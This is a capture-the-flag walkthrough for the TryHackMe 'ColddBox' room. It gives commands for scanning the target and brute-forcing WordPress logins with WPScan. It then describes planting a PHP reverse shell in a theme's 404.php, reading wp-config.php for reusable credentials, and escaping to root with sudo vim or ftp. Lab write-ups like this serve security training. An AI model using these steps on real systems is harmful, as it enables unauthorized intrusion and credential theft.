# TryHackMe — ColddBox (Easy) Walkthrough

> Room: **ColddBox** (Easy)  
> Goal: Gain initial access, retrieve the user flag, then escalate to root.

This box is a classic WordPress chain:
**Nmap → enumerate WP → brute-force WP credentials → theme edit for RCE → read wp-config creds → SSH → sudo/GTFOBins privesc**

---

## 1) Recon (Nmap)

Start with a full TCP scan (all ports) so you don’t miss non-standard services:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `80/tcp` — HTTP (Apache)
  - WordPress detected (generator shows WordPress `4.1.31`)
- `4512/tcp` — SSH (non-standard port)

**Takeaway:** SSH is running, but not on `22`. WordPress is exposed on port `80` and is likely the entry point.

---

## 2) Web enumeration (WordPress)

Visit:

- `http://<IP_ADDRESS>/`

Since WordPress is detected, enumerate both content and users.

### 2.1 Directory scan (Gobuster)

```/dev/null/gobuster.txt#L1-1
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scan.txt -t 50
```

### 2.2 WPScan (users + password guessing)

Enumerate users and attempt password guessing with `rockyou`:

```/dev/null/wpscan.txt#L1-2
wpscan --url http://<IP_ADDRESS>/ -e u -o wpscan_users.txt
wpscan --url http://<IP_ADDRESS>/ -U <FOUND_USER> -P /usr/share/wordlists/rockyou.txt -o wpscan_bruteforce.txt
```

You should recover valid WordPress credentials (username + password).

Login at:

- `http://<IP_ADDRESS>/wp-login.php`

---

## 3) Initial access: WordPress admin → RCE via theme editor

Once logged into WordPress admin, the simplest RCE path is editing a theme template file that is executed by the site.

### 3.1 Choose a template that’s easy to trigger

A common option is the theme’s `404.php` file (it runs when you request a non-existent page).

In WordPress admin:
- `Appearance` → `Editor`
- Select the active theme (example referenced in the room: `twentyfifteen`)
- Open `404.php`
- Replace or append a PHP reverse shell payload

### 3.2 Reverse shell setup

On your attacking machine, start a listener:

```/dev/null/listener.txt#L1-1
nc -lvnp 4444
```

Use a PHP reverse shell payload (example: PentestMonkey variant) configured to your IP/port.

### 3.3 Trigger the reverse shell

Trigger the edited template by visiting a missing page (to hit 404), for example:

- `http://<IP_ADDRESS>/this_should_404`
- or
- `http://<IP_ADDRESS>/themes/twentyfifteen/404.php`

If you edited the right theme file, you should receive a shell as:

- `www-data`

---

## 4) Stabilize the shell (optional but recommended)

```/dev/null/pty.txt#L1-1
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5) Credential reuse: extract WordPress DB creds → SSH

As `www-data`, the web root is the best place to search for credentials.

Common path:
- `/var/www/html/`

Look for `wp-config.php`, which typically contains database credentials.

```/dev/null/wpconfig.txt#L1-2
cd /var/www/html
cat wp-config.php
```

In this room, those credentials are reusable for SSH login as a local user (notably `c0ldd`).

---

## 6) SSH access (non-standard port 4512) → user flag

SSH into the host using the discovered username and password:

```/dev/null/ssh.txt#L1-1
ssh -p 4512 c0ldd@<IP_ADDRESS>
```

Retrieve the user flag from `c0ldd`’s home directory.

---

## 7) Privilege escalation to root (sudo + GTFOBins)

Check sudo permissions:

```/dev/null/sudo_l.txt#L1-1
sudo -l
```

In this box, you can run some tools as root (notably `vim`, and possibly `chmod` / `ftp` depending on the exact sudoers config).

### 7.1 Root via `vim` (GTFOBins)

If `vim` is allowed via sudo, you can spawn a root shell:

```/dev/null/vim_root.txt#L1-1
sudo vim -c ':!/bin/sh'
```

Confirm you are root:

```/dev/null/id_root.txt#L1-2
whoami
id
```

Then read the root flag (commonly `/root/root.txt`).

### 7.2 Root via `ftp` (if allowed)

If `ftp` is allowed via sudo, an interactive shell escape may work:

```/dev/null/ftp_root.txt#L1-2
sudo ftp
!/bin/sh
```

This depends on the exact sudoers entries and installed ftp client behavior.

---

## Summary (attack chain)

1. Nmap → find HTTP + SSH on **4512**
2. WordPress discovered → enumerate users with WPScan
3. WP credentials recovered → login WP admin
4. Edit theme `404.php` → PHP reverse shell → `www-data`
5. Read `wp-config.php` → find creds reused for `c0ldd`
6. SSH as `c0ldd` on port `4512` → user flag
7. `sudo -l` reveals root-capable binaries → `vim` escape → root flag
